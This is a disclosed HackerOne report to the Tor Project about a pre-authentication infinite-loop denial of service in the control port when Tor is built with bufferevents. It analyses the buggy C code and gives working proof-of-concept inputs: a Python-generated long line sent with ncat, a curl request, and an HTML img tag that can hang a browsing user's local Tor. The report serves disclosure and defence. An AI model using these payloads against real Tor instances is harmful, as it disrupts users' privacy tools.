# [tor] control connection pre-auth DoS (infinite loop) with --enable-bufferevents

## Report Details
- **Report ID**: 113424
- **URL**: https://hackerone.com/reports/113424
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-01-29T05:43:35.625Z
- **Disclosed**: 2017-10-19T10:15:36.573Z

## Reporter
- **Username**: guido
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: torproject

## Vulnerability Information
In control.c, this is the loop that retrieves data from the input buffer of the connection, or returns if no complete linefreed-terminated line is available (connection_fetch_from_buf_line() returns 0).

```c
4225   while (1) {
4226     size_t last_idx;
4227     int r;
4228     /* First, fetch a line. */
4229     do {
4230       data_len = conn->incoming_cmd_len - conn->incoming_cmd_cur_len;
4231       r = connection_fetch_from_buf_line(TO_CONN(conn),
4232                               conn->incoming_cmd+conn->incoming_cmd_cur_len,
4233                               &data_len);
4234       if (r == 0)
4235         /* Line not all here yet. Wait. */
4236         return 0;
4237       else if (r == -1) {
4238         if (data_len + conn->incoming_cmd_cur_len > MAX_COMMAND_LINE_LENGTH) {
4239           connection_write_str_to_buf("500 Line too long.\r\n", conn);
4240           connection_stop_reading(TO_CONN(conn));
4241           connection_mark_and_flush(TO_CONN(conn));
4242         }
4243         while (conn->incoming_cmd_len < data_len+conn->incoming_cmd_cur_len)
4244           conn->incoming_cmd_len *= 2;
4245         conn->incoming_cmd = tor_realloc(conn->incoming_cmd,
4246                                          conn->incoming_cmd_len);
4247       }
4248     } while (r != 1);
```

If connection_fetch_from_buf_line() returns -1, this means that the buffer (conn->incoming_cmd) is not large enough. conn->incoming_cmd_len is then increased to a size sufficiently large to hold the incoming command (lines 4243 - 4246). In order for this to work, data_len must be set to this required size by connection_fetch_from_buf_line().

If libevent bufferevents are not enabled, then connection_fetch_from_buf_line() is simply a proxy function for fetch_from_buf_line():

```c
3785   }) ELSE_IF_NO_BUFFEREVENT {
3786     return fetch_from_buf_line(conn->inbuf, data, data_len);
3787   } 
```

This function will indeed set *data_len to the required size if the present buffer size is too small (line 2255):

```c
2241 int
2242 fetch_from_buf_line(buf_t *buf, char *data_out, size_t *data_len)
2243 {
2244   size_t sz;
2245   off_t offset;
2246 
2247   if (!buf->head)
2248     return 0;
2249     
2250   offset = buf_find_offset_of_char(buf, '\n');
2251   if (offset < 0)
2252     return 0;
2253   sz = (size_t) offset;
2254   if (sz+2 > *data_len) {
2255     *data_len = sz + 2;
2256     return -1;
2257   } 
2258   fetch_from_buf(data_out, sz+1, buf);   
2259   data_out[sz+1] = '\0';
2260   *data_len = sz+1; 
2261   return 1;
2262 }   
```

However, if libevent bufferevents are enabled (by ./configuring tor with --enable-bufferevents), then the code on lines (3770 - 3784) is executed instead:

```c
3765 int 
3766 connection_fetch_from_buf_line(connection_t *conn, char *data,
3767                                size_t *data_len)
3768 {   
3769   IF_HAS_BUFFEREVENT(conn, {
3770     int r;
3771     size_t eol_len=0;
3772     struct evbuffer *input = bufferevent_get_input(conn->bufev);
3773     struct evbuffer_ptr ptr =
3774       evbuffer_search_eol(input, NULL, &eol_len, EVBUFFER_EOL_LF);
3775     if (ptr.pos == -1)
3776       return 0; /* No EOL found. */
3777     if ((size_t)ptr.pos+eol_len >= *data_len) {
3778       return -1; /* Too long */
3779     }     
3780     *data_len = ptr.pos+eol_len;
3781     r = evbuffer_remove(input, data, ptr.pos+eol_len);
3782     tor_assert(r >= 0);
3783     data[ptr.pos+eol_len] = '\0';
3784     return 1;
3785   }) ELSE_IF_NO_BUFFEREVENT {            
3786     return fetch_from_buf_line(conn->inbuf, data, data_len);
3787   }
3788 }
```

Following the size check on line 3777, *data_len is not altered and thus remains the same as before the invocation.

For incoming data larger than the initial buffer size (1024 bytes) and contains a linefeed character past 1024 bytes, this sends the control connection input routine into an infinite loop.

# Proof of concept
$ ./configure --enable-bufferevents && make -j4

Now start tor with this torrc:

ControlPort 9999

then in another terminal:

$ cat genpoc.py 
import sys
sys.stdout.write((chr(0x63) * 2000) + chr(0x0A) )

$ python genpoc.py >poc
$ ncat localhost 9999 <poc

tor now hangs and has to be killed with force (kill -9 <pid>).

#Inter-protocol exploit

Since the only two prerequisites of the attack are:

- Input longer than 1024 bytes
- Input contains linefeed character after byte 1024

it's easy to think of other ways of making tor hang than manually creating a connection for this purpose.

```
$ cat genpoc2.py 
print "curl http://localhost:9999/{}".format("x" * 1200)
$ python genpoc2.py >poc.sh
$ bash poc.sh
```

This also causes tor to hang, because curl is sending this to tor:

````
GET /xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx HTTP/1.1
User-Agent: curl/7.35.0
Host: localhost:9999
Accept: */*

```

which is data that adheres to the prerequisites.

Thus, a person running tor with the control server running locally while also using a regular browser can be DoSed via:

```html
<img src='http://localhost:9999/xxxxxxxxxxxxxxxxxxx...'>
```

Guido

## Attachments
No attachments
